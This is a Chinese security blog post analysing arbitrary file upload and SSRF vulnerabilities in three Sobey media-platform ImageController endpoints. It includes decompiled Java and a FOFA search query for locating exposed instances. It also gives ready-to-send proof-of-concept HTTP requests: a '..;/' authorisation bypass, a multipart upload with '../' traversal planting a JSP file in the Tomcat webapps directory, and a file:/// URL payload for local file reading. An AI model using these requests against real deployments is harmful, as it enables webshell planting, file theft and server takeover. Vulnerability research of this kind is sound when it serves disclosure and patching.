---
title: "索贝融媒体 ImageController 多个文件上传漏洞"
source: https://mrxn.net/jswz/sobey-ImageInt-urlUpload.html
---

# 索贝融媒体 ImageController 多个文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/21 08:32
* 933浏览
* [2评论](#comment)
* 2小时
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

索贝产品的文件上传功能存在安全漏洞，攻击者可以通过
[上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
特制的文件（如JSP文件），在服务器上
[执行恶意代码](https://mrxn.net/tag/rce)
，可能导致服务器被完全控制，敏感数据泄露或篡改。

# 影响版本

# fofa语法

> app="SOBEY-融媒体"

# 漏洞分析

## upload

先看
`upload`
实现逻辑

```
@RestController
@RequestMapping({"/mch/ImageInt"})
public class ImageController extends BaseController {
    private static final Logger logger = LoggerFactory.getLogger(ImageController.class);

    @RequestMapping(
        value = {"/upload"},
        method = {RequestMethod.POST}
    )
    public Response upload(@RequestParam("token") String token, @RequestParam("siteCode") String siteCode, HttpServletRequest request) {
        Response response = new Response();

        try {
            String param = IOUtils.toString(request.getInputStream(), "UTF-8");
            String url = saveScreenShotImage(param, token);
            response.setData(url);
        } catch (IOException e) {
            e.printStackTrace();
        }

        response.setStatus(200);
        response.setMessage(this.enTips("image.upload.success", "上传图片成功"));
        return response;
    }
```

跟进
`saveScreenShotImage`
方法

```
public static String saveScreenShotImage(String data, String token) {
    SimpleDateFormat format = new SimpleDateFormat("yyyy/MM/dd/");
    String path = Constant.UPLOAD_PATH + format.format(new Date());
    String filePath = SystemConfigUtil.getDiskpath() + path;
    String fileName = UUID.randomUUID().toString() + ".jpg";
    OutputStream out = null;

    String var12;
    try {
        if (!StringUtil.isNotEmpty(data)) {
            return null;
        }

        if (data.startsWith("data:image/jpg")) {
            data = data.substring(data.indexOf("data:image/jpg;base64,") + "data:image/jpg;base64,".length());
        }

        if (data.startsWith("data:image/jpeg")) {
            data = data.substring(data.indexOf("data:image/jpeg;base64,") + "data:image/jpeg;base64,".length());
        }

        if (data.startsWith("data:image/png")) {
            data = data.substring(data.indexOf("data:image/png;base64,") + "data:image/png;base64,".length());
        }

        if (data.startsWith("data:image/gif")) {
            data = data.substring(data.indexOf("data:image/gif;base64,") + "data:image/gif;base64,".length());
        }

        byte[] bytes = StringUtil.base64Decode(data);

        for(int i = 0; i < bytes.length; ++i) {
            if (bytes[i] < 0) {
                bytes[i] = (byte)(bytes[i] + 256);
            }
        }

        File file = new File(filePath);
        if (!file.exists()) {
            file.mkdirs();
        }

        out = new FileOutputStream(filePath + fileName);
        out.write(bytes);
```

`saveScreenShotImage`
方法，默认对请求体的内容进行base64解码后直接写入
`filePath + fileName`

而
`filePath`
来自
`SystemConfigUtil.`
*`getDiskpath`*
`() + path`
其中
`getDiskpath`
方法逻辑如下

```
public static String getDiskpath() {
    if (!StringUtils.isEmpty(diskpath)) {
        return diskpath;
    } else {
        String diskpathStr = getStorageEnvConfig("diskpath");
        if (StringUtils.isEmpty(diskpathStr)) {
            diskpathStr = getSolarSystemByCache("diskpath", "/mntdisk/", "挂载存储在容器内的路径 默认mntdisk");
        }

        diskpath = diskpathStr;
        return diskpath;
    }
}
```

默认上传文件的位置根目录在
`/mntdisk/`
,结合
`path = Constant.`
*`UPLOAD_PATH`*
`+ format.format(new Date());`
其中
`Constant.UPLOAD_PATH`
定义为
`public static String`
*`UPLOAD_PATH`*
`= "upload/Image/mrtp/";`
，那么path 最终就等于
`/mntdisk/upload/Image/mrtp/年/月/日/uuid.jpg`

## uploadimg

```
@RequestMapping(
    value = {"/uploadimg"},
    method = {RequestMethod.POST}
)
public Response uploadImg(@RequestParam("token") String token, @RequestParam("siteCode") String siteCode, @RequestParam("file") MultipartFile file) {
    Response response = new Response();
    new HiveServiceImpl();

    try {
        long size = file.getSize();
        if (size == 0L) {
            response.setStatus(400);
            response.setMessage("请上传正常图片!");
            return response;
        }

        SimpleDateFormat format = new SimpleDateFormat("yyyy/MM/dd/");
        String path = Constant.UPLOAD_PATH + format.format(new Date());
        String filePath = SystemConfigUtil.getDiskpath() + path;
        File dir = new File(filePath);
        if (!dir.exists()) {
            dir.mkdirs();
        }

        String name = file.getOriginalFilename();
        String fileName;
        if (name.contains("blob")) {
            fileName = UUID.randomUUID().toString().replace("-", "") + ".gif";
        } else {
            fileName = UUID.randomUUID().toString().replace("-", "") + "_" + name;
        }

        File dest = new File(filePath + fileName);
        file.transferTo(dest);
        FileParamDTO fileParamDTO = new FileParamDTO();
        fileParamDTO.setFullName(fileName);
        fileParamDTO.setSuffix(fileName.replaceAll(".*\\.", "").toLowerCase());
        fileParamDTO.setFile(dest);

        FileDTO fileDTO;
        try {
            fileDTO = FileServiceImpl.uploadIntert(token, fileParamDTO);
        } finally {
            if (dest.exists()) {
                dest.delete();
            }

        }

        if (fileDTO == null || StringUtils.isEmpty(fileDTO.getShowUrl())) {
            return Response.paramError("上传出错.");
        }

        response.setStatus(200);
        response.setMessage(this.enTips("image.upload.success", "上传图片成功"));
        String showUrl = fileDTO.getShowUrl();
        response.setData(showUrl);
    } catch (Exception e) {
        e.printStackTrace();
        response.setStatus(400);
        response.setMessage("上传图片异常!" + e.getMessage());
    }

    return response;
}
```

uploadimg方法
[文件上传](https://mrxn.net/tag/rce)
保存路和上面的upload方法是一样的，但是不同的地方在于保存的文件名是取自上传当中设置的
`filename`
的值（
`String name = file.getOriginalFilename();`
），但是
`filename`
不能包含
`blob`
字符，否则保存文件后缀设置为固定的
`.gif`
（
``` if (name.contains("blob")) { `` fileName = UUID. ```
*`randomUUID`*
`().toString().replace("-", "") + ".gif";`
）

## urlUpload

```
@RequestMapping(
    value = {"/urlUpload"},
    method = {RequestMethod.POST}
)
public Response urlTobase(@RequestParam("token") String token, @RequestParam("siteCode") String siteCode, @RequestParam(value = "url",required = false) String urll, HttpServletRequest request) {
    Response response = new Response();
    SimpleDateFormat format = new SimpleDateFormat("yyyy/MM/dd/");
    String path = Constant.UPLOAD_PATH + format.format(new Date());
    String folderPath = SystemConfigUtil.getDiskpath() + path;
    String fileName = UUID.randomUUID().toString() + ".jpg";

    try {
        String param = IOUtils.toString(request.getInputStream(), "UTF-8");
        if (StringUtil.isNotEmpty(param)) {
            urll = param;
        } else {
            urll = URLDecoder.decode(urll);
        }

        FileUtil.downloadFile(urll, folderPath, fileName);
        File dest = new File(folderPath + fileName);
        FileParamDTO fileParamDTO = new FileParamDTO();
        fileParamDTO.setFullName(fileName);
        fileParamDTO.setSuffix(fileName.replaceAll(".*\\.", "").toLowerCase());
        fileParamDTO.setFile(dest);

        FileDTO fileDTO;
        try {
            fileDTO = FileServiceImpl.uploadIntert(token, fileParamDTO);
        } finally {
            if (dest.exists()) {
                dest.delete();
            }

        }

        if (fileDTO == null || StringUtils.isEmpty(fileDTO.getShowUrl())) {
            return Response.paramError("上传出错.");
        }

        response.setData(fileDTO.getShowUrl());
    } catch (IOException e) {
        logger.error("下载图片出错。");
        e.printStackTrace();
        response.setMessage("下载图片出错。" + e.getMessage());
    }

    response.setStatus(200);
    return response;
}
```

保存路径跟上面也一样，不同的是文件内容由
`FileUtil.downloadFile`
实现，看下它的逻辑

```
public static String downloadFile(String urll, String folderPath, String fileName) throws IOException {
    LogUtil.getLogger().info("下载图片地址: " + urll);
    URLConnection urlConnection = getUrlConnection(urll);
    InputStream inputStream = urlConnection.getInputStream();
    DataInputStream dataInputStream = new DataInputStream(inputStream);
    File folder = new File(folderPath);
    if (!folder.exists()) {
        folder.mkdirs();
    }

    if (!folderPath.endsWith("/") && folderPath.endsWith("\\")) {
        folderPath = folderPath + File.separator;
    }

    String filePathName = folderPath + fileName;
    File file = new File(filePathName);
    FileOutputStream fileOutputStream = new FileOutputStream(file);
    byte[] buffer = new byte[1024];

    int length;
    while((length = dataInputStream.read(buffer)) > 0) {
        fileOutputStream.write(buffer, 0, length);
    }

    inputStream.close();
    dataInputStream.close();
    fileOutputStream.close();
    LogUtil.getLogger().info("下载图片完成。");
    return filePathName;
}
```

参数
**urll**
被带入了
**getUrlConnection**
方法

```
private static URLConnection getUrlConnection(String urll) throws IOException {
    if (urll != null && urll.startsWith("https")) {
        HttpClientUtil.initHttpsURLConnection();
    }

    URL url = new URL(StringUtil.getUrlUrlEncode(urll));
    String proxyIpPort = SystemConfigUtil.getSolarSystemByCache("proxyIpPort", "");
    String proxyType = SystemConfigUtil.getSolarSystemByCache("proxyType", "HTTP");
    URLConnection urlConnection = null;
    String reverseProxyPrefix = SystemConfigUtil.getReverseProxyPrefix();
    if (StringUtils.isNotEmpty(proxyIpPort)) {
        String[] split = proxyIpPort.split(":");
        Proxy proxy = null;
        if ("SOCKS".equalsIgnoreCase(proxyType)) {
            proxy = new Proxy(Type.SOCKS, new InetSocketAddress(split[0], Integer.valueOf(split[1])));
        } else {
            proxy = new Proxy(Type.HTTP, new InetSocketAddress(split[0], Integer.valueOf(split[1])));
        }

        urlConnection = url.openConnection(proxy);
    } else {
        if (!StringUtils.isEmpty(reverseProxyPrefix)) {
            url = new URL(StringUtil.dealReverseProxyUrl(urll, reverseProxyPrefix));
        }

        urlConnection = url.openConnection();
    }

    Integer httpTimeOut = SystemConfigUtil.getHttpTimeOut();
    urlConnection.setConnectTimeout(httpTimeOut);
    urlConnection.setReadTimeout(httpTimeOut);
    String[] noRefererUrls = SystemConfigUtil.getSolarSystemByCache("noRefererUrls", "wx.qlogo.cn,mmsns.qpic.cn,mmbiz.qpic.cn,vcloud1023.tc.qq.com,rcgi.video.qq.com").split(",");
    boolean noReferer = false;

    for(String noRefererUrl : noRefererUrls) {
        if (urll.contains(noRefererUrl)) {
            noReferer = true;
            break;
        }
    }

    if (!noReferer) {
        urlConnection.setRequestProperty("referer", urll.replaceAll("(?<!/)/[^/]+", ""));
    }

    return urlConnection;
}
```

关键在于
`URL url = new URL(StringUtil.getUrlUrlEncode(urll));`
`urll`
被直接使用
`new URL`
进行操作，没有任何过滤或校验，因此此处还存在伪协议如
**file:///**
协议的利用。因此同时此处还存在SSRF漏洞。

# 漏洞复现

## upload

```
POST /sobey-mchEditor/js/..;/mch/ImageInt/upload?siteCode=&token= HTTP/1.1
Host: sobey.mrxn.net
Content-Type: text/plain

{{b64(123)}}

HTTP/1.1 200
Server: mginx
Content-Type: application/json
Connection: keep-alive
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: Content-Type,Content-Length, Authorization, Accept,X-Requested-With
Access-Control-Allow-Methods: PUT,POST,GET,DELETE,OPTIONS
Set-Cookie: SERVERID=; Expires=Thu, 01-Jan-1970 00:00:01 GMT; path=/
X-Server-By: Sobey
Content-Length: 57

{"data":null,"message":"上传图片成功","status":200}
```

结合之前的文件上传，
[命令执行](https://mrxn.net/tag/rce)
可以看到文件保存成功

![索贝融媒体 ImageController 多个文件上传漏洞](https://image.mrxn.net/ec215021863b4e039b4a20b458eb16b3.webp)

## uploadimg

```
POST /sobey-mchEditor/image/..;/mch/ImageInt/uploadimg?token=&siteCode= HTTP/1.1
Host: sobey.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file";filename="1.png/../../../../../../../../../../../usr/local/tomcat/webapps/sobey-mchEditor/1.jsp"

<%out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary--
```

![索贝融媒体 ImageController 多个文件上传漏洞](https://image.mrxn.net/cf5313037a754508a7be24c24e087c24.webp)

可以看到文件上传并没有穿越成功，可能跟
`file.transferTo`
的实现有关，因为有两种实现方式

![索贝融媒体 ImageController 多个文件上传漏洞](https://image.mrxn.net/195a6f0811a74f7ba062c0ad01abe695.webp)

![索贝融媒体 ImageController 多个文件上传漏洞](https://image.mrxn.net/892e1d36c7f84bb3bcb8a7772c42d903.webp)

其中
`StandardMultipartFile`
是 Spring Boot 和现代 Spring MVC（使用 Servlet 3.0+ 容器，如 Tomcat 7+）的
**默认实现**
。它包装了标准的
`javax.servlet.http.Part`
对象

**对应的**
`transferTo`
**实现**
：

```
// 来源于 org.springframework.web.multipart.support.StandardMultipartHttpServletRequest$StandardMultipartFile
public void transferTo(File dest) throws IOException, IllegalStateException {
    // 关键点：调用的是 part.write(dest.getPath())
    this.part.write(dest.getPath());
}
```

1. `dest.getPath()`
   方法返回的是构造
   `File`
   对象时传入的原始路径字符串，即包含
   `../`
   的恶意路径，例如
   `/opt/uploads/2023/10/27/[UUID]_../../../../../../tmp/shell.jsp`
   。
2. **关键在于**
   `this.part.write(String fileName)`
   **方法**
   。根据 Servlet 3.0 规范（JSR 315），
   `Part.write(String fileName)`
   方法被要求
   **必须**
   仅使用
   `fileName`
   参数中的文件名部分（即最后一个路径分隔符之后的内容），并忽略所有目录信息。
3. 具体到 Tomcat 的实现（
   `org.apache.catalina.core.ApplicationPart`
   ），它会检查传入的字符串中是否包含路径分隔符 (
   `/`
   或
   `\`
   )。如果包含，它会抛出
   `IllegalArgumentException`
   ，或者更常见的行为是，它会从字符串中提取出基础文件名（basename）。例如，对于输入
   `../../../../../tmp/shell.jsp`
   ，它只会提取出
   `shell.jsp`
   。
4. 因此，
   `part.write()`
   会将文件内容以
   `shell.jsp`
   这个名字写入到一个由容器管理的、安全的临时目录中，而不是攻击者指定的
   `/tmp/`
   目录。
   **目录穿越的poc被**
   **Servlet**
   **容器的**
   `Part`
   **阻止了。**

**结论**
：在默认的 Spring 环境下，尽管您的业务代码存在目录穿越漏洞，但由于底层
`StandardMultipartFile`
依赖的 Servlet
`Part`
API 具有内置的安全设计，导致攻击无法成功。

而
`CommonsMultipartFile`
的实现是基于 Apache Commons FileUpload ，
**对应的**
`transferTo`
**实现**
：

```
// 来源于 org.springframework.web.multipart.commons.CommonsMultipartFile
public void transferTo(File dest) throws IOException, IllegalStateException {
    // ... 省略部分检查代码 ...
    try {
        // 关键点：调用的是 fileItem.write(dest)
        this.fileItem.write(dest);
    }
    // ... 省略异常处理 ...
}
```

1. 这里的
   `dest`
   是一个
   `java.io.File`
   对象，它在内存中已经将路径
   `/opt/uploads/2023/10/27/[UUID]_../../../../../../tmp/shell.jsp`
   解析完毕。
2. `this.fileItem.write(File dest)`
   方法（来源于 Apache Commons FileUpload 的
   `DiskFileItem`
   ）的行为与
   `Part.write`
   完全不同。它通常会直接委托给标准的 Java I/O 操作，如
   `new FileOutputStream(dest)`
   。
3. `new FileOutputStream(File file)`
   在打开文件时，会遵循文件系统的规则来解析路径。此时，
   `../`
   序列会被文件系统正确处理，导致路径向上跳转。
4. 最终，文件会被成功写入到
   `dest.getCanonicalPath()`
   解析后的路径，即
   `/tmp/shell.jsp`
   。

* **结论**
  ：如果您的应用环境配置为使用
  `CommonsMultipartResolver`
  ，那么代码中的目录穿越漏洞将是
  **可以被成功利用的**
  。

## urlUpload

```
POST /sobey-mchEditor/js/..;/mch/ImageInt/urlUpload HTTP/1.1
Host: sobey.mrxn.net
Content-Type: application/x-www-form-urlencoded

siteCode=1&token=1&url=file:///mntdisk/upload/Image/mrtp/2025/07/12/test.png
```

查看mntdisk/upload/Image/mrtp/目录下对应日期目录，成功生成了同样大小的图片文件

![索贝融媒体 ImageController 多个文件上传漏洞](https://image.mrxn.net/386e0f853fd149268e218758bf3cd550.webp)

SSRF

![索贝融媒体 ImageController 多个文件上传漏洞](https://image.mrxn.net/525146a9a83f4c589529a7a6379c9a32.webp)

后期可使用file:/// 文件读取配合其他可以查看图片的接口进行文件读取进一步利用。

* 标签：
* [#
  漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#
  web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#
  代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#
  Java](https://mrxn.net/tag/Java)
* [#
  文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[索贝融媒体 ImageController 多个文件上传漏洞](https://mrxn.net/jswz/sobey-ImageInt-urlUpload.html)
  
文章链接：
<https://mrxn.net/jswz/sobey-ImageInt-urlUpload.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-ImageInt-urlUpload.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-ImageInt-urlUpload.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});